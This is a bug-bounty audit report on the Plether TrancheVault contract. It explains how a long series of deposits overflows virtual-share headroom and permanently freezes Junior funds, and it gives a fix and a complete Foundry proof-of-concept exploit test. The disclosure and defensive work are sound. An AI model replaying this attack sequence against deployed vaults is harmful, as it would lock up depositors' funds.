# \#99499 [SC-Critical] Successful Junior mints overflow virtual-share headroom and permanently freeze funds

**Submitted on Nov 13th 2026 at 22:18:33 UTC by @Tradi3 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99499
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Permanent freezing of funds

## Description

# Successful Junior mints overflow virtual-share headroom and permanently freeze funds

## Brief / Intro

A Junior deposit epoch can successfully mint raw ERC-20 supply up to \`type(uint256).max - 999\`. The mint fits, so OpenZeppelin ERC20 accepts it. Plether nevertheless requires 1,000 additional virtual shares in every later ERC-4626 conversion. The next \`rawSupply + 1,000\` is mathematically \`2^256\` and panics.

This permanently disables Junior redemption quotes, new redemption requests, and HousePool funding of already-matured Junior redemptions. The exact-pin PoC gives an unrelated terminal depositor **271,748.729791 USDG** of mathematically exact Junior entitlement, claims all epoch shares with zero dust, and proves neither owner donation/\`accountExcess()\` nor waiting provides a supply-reducing recovery.

Target: Plether commit \`a82d4fefb02768e5b3bddcc97dee371eee24fea8\`, Junior \`TrancheVault.sol\` and its HousePool redemption consumer. Impact: **Critical — Permanent freezing of funds**.

## Vulnerability Details

The release uses a 1,000-share virtual offset (\`TrancheVault.sol:36\`). Deposit pricing at lines 1398-1410 computes:

~~~text
shares = floor(netAssets * (pricingSupply + 1000) / denominator)
~~~

HousePool then calls \`finalizeDepositEpochFromPool\` (lines 1445-1475). That function transfers the assets and calls \`_mint(address(this), shares)\`, but enforces no post-mint invariant reserving headroom for the mandatory virtual shares. HousePool's checks at \`HousePool.sol:1070-1078\` only verify that the raw supply delta equals the quoted shares.

The PoC aligns adjusted Junior supply to \`2^39\`, then multiplies it by \`2^20\` through ten ordinary successful epochs, reaching \`2^239\`. The terminal state has:

~~~text
P = 2,073,301                         terminal pricing principal
D = P + 1 = 2,073,302                 quote denominator
A = D * (2^17 - 1)
  = 271,749,766,442 atoms             terminal aggregate deposit
S + 1000 = 2^239                      pre-mint adjusted supply
minted = A * 2^239 / D
       = (2^17 - 1) * 2^239
post-mint adjusted supply = 2^256
post-mint raw supply = 2^256 - 1000
                     = type(uint256).max - 999
~~~

Every terminal operation through \`_mint\` succeeds because the **raw** supply remains representable. Afterward:

- vault conversions at \`TrancheVault.sol:1853-1866\` evaluate \`accruedTotalSupply() + VIRTUAL_SHARES\` and panic;
- HousePool snapshots the raw supply, but \`HousePoolRedemptionMathLib.sol:45-46\` evaluates \`supply + virtualShares\` before any redemption burn and panics;
- therefore \`fundRedeemEpoch\` can never reach its burn at \`TrancheVault.sol:1498\`.

The terminal denominator is \`2 * 1,036,651\`. The attacker contributes exactly 1,036,651 atoms and the honest victim contributes 271,748,729,791 atoms. Both allocations divide exactly. After both public claims, \`depositClaimEscrowShares == 0\`; no allocation dust is burned, and raw supply remains \`type(uint256).max - 999\`.

## Attack Sequence

1. Honest LPs establish 500 USDG Junior and 2,000 USDG Senior liquidity under release defaults.
2. Over 110,756,042 seconds (about 3.512 years), the release's 8% Senior coupon periodically leaves small positive Junior pricing principal. The attacker uses twelve public zero-fee Junior deposits totaling **112.782699 USDG**. Every quote, settlement, mint, claim, and invariant check succeeds.
3. Before the terminal epoch, adjusted Junior supply is exactly \`2^239\`.
4. The honest victim requests 271,748.729791 USDG first. The attacker observes it and joins the same public epoch with 1.036651 USDG.
5. An existing unrelated Junior holder also queues a redemption for the following epoch while conversions still work.
6. Permissionless LP settlement finalizes the terminal deposit. Raw supply becomes \`type(uint256).max - 999\`.
7. Both terminal depositors claim their exact shares; zero share dust remains.
8. After cooldown, the victim's estimate and redemption request panic. The existing matured redemption makes HousePool settlement panic before funding or burning and can no longer be cancelled.
9. Even an owner-funded 1,000,000 USDG donation followed by documented \`accountExcess()\` leaves the conversion panic unchanged because it changes assets, not raw supply.

No trade, price change, Pyth data, trusted-role trigger, non-release parameter, storage write, or modified in-scope contract is used.

## Impact Details

The victim's mathematical entitlement is exactly **271,748.729791 USDG**. The PoC checks this from the exact terminal ratio before demonstrating that the implementation cannot evaluate or redeem it.

All attacker deposits total **112.782699 USDG**, including the terminal join. The demonstrated victim-funds-to-attacker-deposit ratio is approximately **2,409.49:1**, above the competition page's stated 100:1 non-griefing baseline. No attacker profit is required for the accepted Critical impact: the already-minted victim funds are permanently inaccessible for the lifetime of this immutable vault.

The proof claims permanent freezing of Junior funds only. It does not rely on a claim that every Senior path is permanently frozen.

## Why the state is permanent

- Transfers do not reduce total supply.
- Mature redemption cancellation is unavailable.
- Redemption funding must price shares before reaching the only ordinary supply burn.
- Exact terminal allocation leaves no deposit dust to burn.
- Donations, recapitalization, P&L, waiting, and \`accountExcess()\` change assets, not supply headroom.
- The Pool's Junior vault address is set once; there is no USDG/share rescue or administrative burn.
- Pausing prevents additional entry but does not repair already-minted supply.

## Relationship to confirmed #99237 / #97628

This report deliberately discloses the related amplification family. Our #99237 is a confirmed High duplicate of #97628, titled “Near-zero junior principal lets any depositor overflow the junior deposit quote and freeze all LP epoch settlement, including senior redemptions.” That path overflows a **pending deposit quote before mint** and its demonstrated state is repaired by owner donation/\`accountExcess()\`.

Here every quote, finalization, and mint succeeds. The terminal operation poisons the separate **post-mint virtual-share headroom** used by redemptions. Donation does not repair it, already-minted shares are frozen, and the required fix must cap raw supply below \`type(uint256).max - VIRTUAL_SHARES\`. The overlap is transparent; if triage groups the amplification family, this report should receive the Critical duplicate treatment rather than being evaluated as the donation-curable High state.

## Feasibility disclosure

The deterministic proof requires about 3.512 years of mostly quiescent coupon history and a large terminal honest deposit. This is a feasibility limitation, not hidden. The program page says impact and severity are calculated before feasibility and that infeasibility changes payout, not impact. It also states this exact in-scope code is planned for Arbitrum One and permits Mock USDG in Foundry PoCs. The PoC uses Mock USDG only as the permitted settlement-token fixture; the bug and frozen entitlement are in TrancheVault/HousePool accounting.

## Recommended Fix

Before every raw share mint—including bootstrap, deposit finalization, and maintenance-fee materialization—enforce a global invariant such as:

~~~text
accruedRawAndPendingSupply <= type(uint256).max - VIRTUAL_SHARES
sharesToMint <= type(uint256).max - VIRTUAL_SHARES - accruedRawAndPendingSupply
~~~

Reject or safely refund an epoch that would violate it. Keep conversion and HousePool redemption math defensive, but do not use unchecked addition: wrapping the virtual offset would misprice funds.

## References

- \`TrancheVault.sol:36\` — virtual shares
- \`TrancheVault.sol:1398-1410\` — deposit quote
- \`TrancheVault.sol:1445-1475\` — unbounded raw mint
- \`TrancheVault.sol:1478-1502\` — redemption burn reached only after pricing
- \`TrancheVault.sol:1853-1866\` — poisoned conversions
- \`HousePool.sol:944-1028\` — redemption pricing before burn
- \`HousePool.sol:1030-1098\` — successful terminal deposit settlement
- \`HousePoolRedemptionMathLib.sol:8-11,45-46\` — stated bounded-supply assumption and overflowing offset

## Proof of Concept

# Proof of Concept

## Run

1. Use the competition repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
2. Save the file below as `packages/perps/test/perps/CodexVirtualSharePermanentFreeze.t.sol`.
3. From `packages/perps`, run:

~~~bash
forge test --match-path test/perps/CodexVirtualSharePermanentFreeze.t.sol --match-test test_SuccessfulMintsPermanentlyFreezeUnrelatedJuniorFunds -vvv
~~~

Verified locally with Forge 1.5.1 on the same machine that wrote the test:

~~~text
[PASS] test_SuccessfulMintsPermanentlyFreezeUnrelatedJuniorFunds()
Suite result: ok. 1 passed; 0 failed; 0 skipped
~~~

The test uses the repository's existing `BasePerpTest` and MockUSDG fixture. It does not modify any in-scope contract. It proves the successful terminal quote/mint, exact victim allocation, zero dust, victim redemption panic, matured unrelated redemption failure, unavailable cancellation, and failed donation recovery.

## Complete test

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {stdError} from "forge-std/StdError.sol";

contract CodexVirtualSharePermanentFreezeTest is BasePerpTest {
    uint256 internal constant VIRTUAL_OFFSET = 1000;
    uint256 internal constant AMPLIFICATION_FACTOR = 1 << 20;
    uint256 internal constant TERMINAL_FACTOR = 1 << 17;
    uint256 internal constant RELEASE_SEED = 1e6;

    address internal constant EXISTING_JUNIOR = address(0xB001);
    address internal constant EXISTING_SENIOR = address(0xB002);
    address internal constant TERMINAL_VICTIM = address(0xB003);
    address internal constant ATTACKER = address(0xBAD1);

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return RELEASE_SEED;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return RELEASE_SEED;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        assertEq(pool.seniorRateBps(), 800);
        assertEq(juniorVault.maintenanceFeeAprBps(), 0);
        assertEq(pool.minTrancheDepositAssets(), 1e6);
    }

    function test_SuccessfulMintsPermanentlyFreezeUnrelatedJuniorFunds() public {
        _fundTrancheAsync(juniorVault, EXISTING_JUNIOR, 500e6);
        _fundTrancheAsync(seniorVault, EXISTING_SENIOR, 2_000e6);

        assertEq(juniorVault.totalSupply(), 501_333_221_592);
        assertEq(pool.juniorPrincipal(), 500_999_325);
        assertEq(pool.seniorPrincipal(), 2_001_000_675);
        assertEq(pool.lastSeniorCouponCheckpointTime(), 1_709_798_400);

        _settleAmplifyingDeposit(19_471_448, 58_983_360, 201_593_584, 1 << 39);

        uint256[10] memory elapsed = [
            uint256(37_881_929),
            1_475_383,
            816_599,
            2_444_739,
            647_912,
            485_134,
            3_068_756,
            1_121_859,
            2_397_165,
            1_429_606
        ];
        uint256[10] memory pricingPrincipal =
            [uint256(8), 4, 14, 3, 2, 18, 6, 14, 8, 1];

        uint256 adjustedSupply = 1 << 39;
        for (uint256 i; i < elapsed.length; ++i) {
            uint256 denominator = pricingPrincipal[i] + 1;
            uint256 assets = denominator * (AMPLIFICATION_FACTOR - 1);
            adjustedSupply <<= 20;
            _settleAmplifyingDeposit(assets, elapsed[i], pricingPrincipal[i], adjustedSupply);
        }
        assertEq(adjustedSupply, 1 << 239);
        assertEq(juniorVault.totalSupply(), (1 << 239) - VIRTUAL_OFFSET);

        uint256 terminalDenominator = 2_073_302;
        uint256 terminalAssets = terminalDenominator * (TERMINAL_FACTOR - 1);
        uint256 attackerAssets = 1_036_651;
        uint256 victimAssets = terminalAssets - attackerAssets;
        assertEq(terminalAssets, 271_749_766_442);
        assertEq(victimAssets, 271_748_729_791);

        uint256 terminalDepositId =
            _requestPublicDeposit(juniorVault, TERMINAL_VICTIM, victimAssets);
        assertEq(_requestPublicDeposit(juniorVault, ATTACKER, attackerAssets), terminalDepositId);

        uint256 cutoff = pool.lpEpochStart(terminalDepositId) - juniorVault.LP_REQUEST_CUTOFF_DURATION();
        vm.warp(cutoff + 1);
        uint256 existingShares = juniorVault.balanceOf(EXISTING_JUNIOR);
        vm.prank(EXISTING_JUNIOR);
        uint256 futureRedeemId =
            juniorVault.requestRedeem(existingShares, EXISTING_JUNIOR, EXISTING_JUNIOR);
        assertEq(futureRedeemId, terminalDepositId + 1);

        uint256 terminalTime = pool.lastSeniorCouponCheckpointTime() + 1 hours;
        vm.warp(terminalTime);
        _refreshMark();
        (, uint256 projectedJunior) = pool.getPendingDepositTrancheState();
        assertEq(projectedJunior, terminalDenominator - 1);

        uint256 terminalShares = (TERMINAL_FACTOR - 1) * (1 << 239);
        assertEq(
            juniorVault.quoteDepositFromState(
                terminalAssets,
                projectedJunior,
                juniorVault.accruedTotalSupply(),
                0
            ),
            terminalShares
        );

        IHousePool.LpEpochSettlementResult memory terminalResult = pool.settleLpEpoch(0, 0);
        assertEq(terminalResult.juniorDepositAssets, terminalAssets);
        assertEq(terminalResult.juniorDepositShares, terminalShares);
        assertEq(juniorVault.totalSupply(), type(uint256).max - 999);
        assertEq(pool.juniorPrincipal() + 1, terminalDenominator * TERMINAL_FACTOR);

        vm.prank(ATTACKER);
        uint256 attackerShares =
            juniorVault.claimDeposit(terminalDepositId, attackerAssets, ATTACKER, ATTACKER);
        vm.prank(TERMINAL_VICTIM);
        uint256 victimShares = juniorVault.claimDeposit(
            terminalDepositId,
            victimAssets,
            TERMINAL_VICTIM,
            TERMINAL_VICTIM
        );

        assertEq(attackerShares, Math.mulDiv(attackerAssets, 1 << 239, terminalDenominator));
        assertEq(victimShares, Math.mulDiv(victimAssets, 1 << 239, terminalDenominator));
        assertEq(Math.mulDiv(victimShares, terminalDenominator, 1 << 239), victimAssets);
        assertEq(juniorVault.depositClaimEscrowShares(), 0);
        assertEq(juniorVault.totalSupply(), type(uint256).max - 999);
        assertEq(juniorVault.accruedTotalSupply(), type(uint256).max - 999);

        vm.warp(terminalTime + juniorVault.DEPOSIT_COOLDOWN());
        _refreshMark();

        vm.expectRevert(stdError.arithmeticError);
        juniorVault.estimateRedeemAssets(victimShares);
        vm.prank(TERMINAL_VICTIM);
        vm.expectRevert(stdError.arithmeticError);
        juniorVault.requestRedeem(victimShares, TERMINAL_VICTIM, TERMINAL_VICTIM);

        uint256 ownerDonation = 1_000_000e6;
        settlementToken.mint(address(this), ownerDonation);
        settlementToken.transfer(address(pool), ownerDonation);
        pool.accountExcess();
        vm.expectRevert(stdError.arithmeticError);
        juniorVault.estimateRedeemAssets(victimShares);

        uint256 rawSupplyBefore = juniorVault.totalSupply();
        uint256 queuedShares = juniorVault.pendingRedeemRequest(futureRedeemId, EXISTING_JUNIOR);
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);
        assertEq(juniorVault.totalSupply(), rawSupplyBefore);
        assertEq(juniorVault.pendingRedeemRequest(futureRedeemId, EXISTING_JUNIOR), queuedShares);
        assertEq(juniorVault.claimableRedeemRequest(futureRedeemId, EXISTING_JUNIOR), 0);

        vm.prank(EXISTING_JUNIOR);
        vm.expectRevert(bytes4(keccak256("TrancheVault__RedeemCancellationUnavailable()")));
        juniorVault.cancelRedeemRequest(futureRedeemId, EXISTING_JUNIOR, EXISTING_JUNIOR);
    }

    function _settleAmplifyingDeposit(
        uint256 assets,
        uint256 couponElapsed,
        uint256 expectedPricingPrincipal,
        uint256 targetAdjustedSupply
    ) internal {
        uint256 rawSupplyBefore = juniorVault.totalSupply();
        uint256 adjustedSupplyBefore = rawSupplyBefore + VIRTUAL_OFFSET;
        uint256 checkpoint = pool.lastSeniorCouponCheckpointTime();
        uint256 requestId = _requestPublicDeposit(juniorVault, ATTACKER, assets);

        vm.warp(checkpoint + couponElapsed);
        _refreshMark();
        (, uint256 projectedJunior) = pool.getPendingDepositTrancheState();
        assertEq(projectedJunior, expectedPricingPrincipal);

        uint256 expectedShares = targetAdjustedSupply - adjustedSupplyBefore;
        assertEq(
            Math.mulDiv(
                assets,
                adjustedSupplyBefore,
                expectedPricingPrincipal + 1,
                Math.Rounding.Floor
            ),
            expectedShares
        );

        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);
        assertEq(result.juniorDepositAssets, assets);
        assertEq(result.juniorDepositShares, expectedShares);

        vm.prank(ATTACKER);
        assertEq(
            juniorVault.claimDeposit(requestId, assets, ATTACKER, ATTACKER),
            expectedShares
        );
        assertEq(juniorVault.totalSupply() + VIRTUAL_OFFSET, targetAdjustedSupply);
        assertEq(juniorVault.accruedTotalSupply(), juniorVault.totalSupply());
    }

    function _requestPublicDeposit(
        TrancheVault vault,
        address actor,
        uint256 assets
    ) internal returns (uint256 requestId) {
        settlementToken.mint(actor, assets);
        vm.startPrank(actor);
        settlementToken.approve(address(vault), assets);
        requestId = vault.requestDeposit(assets, actor, actor);
        vm.stopPrank();
    }

    function _refreshMark() internal {
        uint256 markPrice = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(markPrice == 0 ? 1e8 : markPrice, uint64(block.timestamp));
    }
}

~~~
